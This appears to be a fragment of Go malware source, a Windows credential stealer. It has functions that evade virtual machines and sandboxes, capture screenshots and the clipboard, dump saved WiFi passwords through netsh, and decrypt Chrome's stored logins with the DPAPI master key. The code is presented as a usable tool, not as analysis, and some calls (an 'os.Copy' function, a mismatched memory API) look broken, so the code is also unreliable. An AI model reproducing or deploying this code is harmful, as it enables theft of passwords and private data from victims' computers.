func isVMOrSandbox() bool {
	if runtime.NumCPU() < 4 {
		return true
	}
	var mem windows.MemoryStatusEx
	mem.Length = uint32(unsafe.Sizeof(mem))
	if windows.GetPhysicallyInstalledSystemMemory(&mem.TotalPhys) == 0 || mem.TotalPhys < 4*1024*1024*1024 {
		return true
	}
	// Add proc checks if you want
	return false
}

func takeScreenshot() string {
	n := screenshot.NumActiveDisplays()
	var buf bytes.Buffer
	for i := 0; i < n; i++ {
		img, err := screenshot.CaptureDisplay(i)
		if err != nil {
			continue
		}
		png.Encode(&buf, img)
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func getClipboard() string {
	// Simple fallback using powershell if you don't want deps, but screenshot lib is better
	cmd := exec.Command("powershell", "-Command", "Get-Clipboard")
	out, _ := cmd.Output()
	return string(out)
}

func getHostname() string {
	h, _ := os.Hostname()
	return h
}

// Bonus WiFi passwords
func grabWiFi() []map[string]string {
	var wifis []map[string]string
	out, err := exec.Command("netsh", "wlan", "show", "profiles").Output()
	if err != nil {
		return wifis
	}
	profiles := regexp.MustCompile(`All User Profile\s*:\s*(.*)`).FindAllStringSubmatch(string(out), -1)
	for _, p := range profiles {
		name := strings.TrimSpace(p[1])
		out2, err := exec.Command("netsh", "wlan", "show", "profile", name, "key=clear").Output()
		if err != nil {
			continue
		}
		key := regexp.MustCompile(`Key Content\s*:\s*(.*)`).FindStringSubmatch(string(out2))
		if len(key) > 1 {
			wifis = append(wifis, map[string]string{"ssid": name, "pass": strings.TrimSpace(key[1])})
		}
	}
	return wifis
}

func grabChromePasswords() []map[string]string {
	var creds []map[string]string
	appData := os.Getenv("LOCALAPPDATA")
	localState := filepath.Join(appData, "Google", "Chrome", "User Data", "Local State")
	loginDBs := []string{filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Login Data")}
	// Add profiles if needed

	data, err := ioutil.ReadFile(localState)
	if err != nil {
		return creds
	}
	var state struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	json.Unmarshal(data, &state)
	encKey, _ := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	encKey = encKey[5:] // remove DPAPI prefix
	masterKey, err := windows.CryptUnprotectData(encKey, nil, nil, nil, 0)
	if err != nil {
		return creds
	}

	for _, dbPath := range loginDBs {
		if _, err := os.Stat(dbPath); os.IsNotExist(err) {
			continue
		}
		tmpDB := dbPath + ".tmp"
		os.Copy(dbPath, tmpDB) // Chrome locks it
		db, err := sql.Open("sqlite3", tmpDB)
		if err != nil {
			continue
		}
		rows, _ := db.Query("SELECT origin_url, username_value, password_value FROM logins")
		for rows.Next() {
			var url, user string
			var encPass []byte
			rows.Scan(&url, &user, &encPass)
			if len(encPass) > 0 && string(encPass[:3]) == "v10" || string(encPass[:3]) == "v11" {
				nonce := encPass[3:15]
				ciphertext := encPass[15 : len(encPass)-16]
				tag := encPass[len(encPass)-16:]
				block, _ := aes.NewCipher(masterKey)
				aesgcm, _ := cipher.NewGCMWithNonceSize(block, 12)
				plain, _ := aesgcm.Open(nil, nonce, append(ciphertext, tag...), nil)
				creds = append(creds, map[string]string{
					"url":      url,
					"username": user,
					"password": string(plain),
				})
			}
		}
		db.Close()
		os.Remove(tmpDB)
	}
	return creds
}

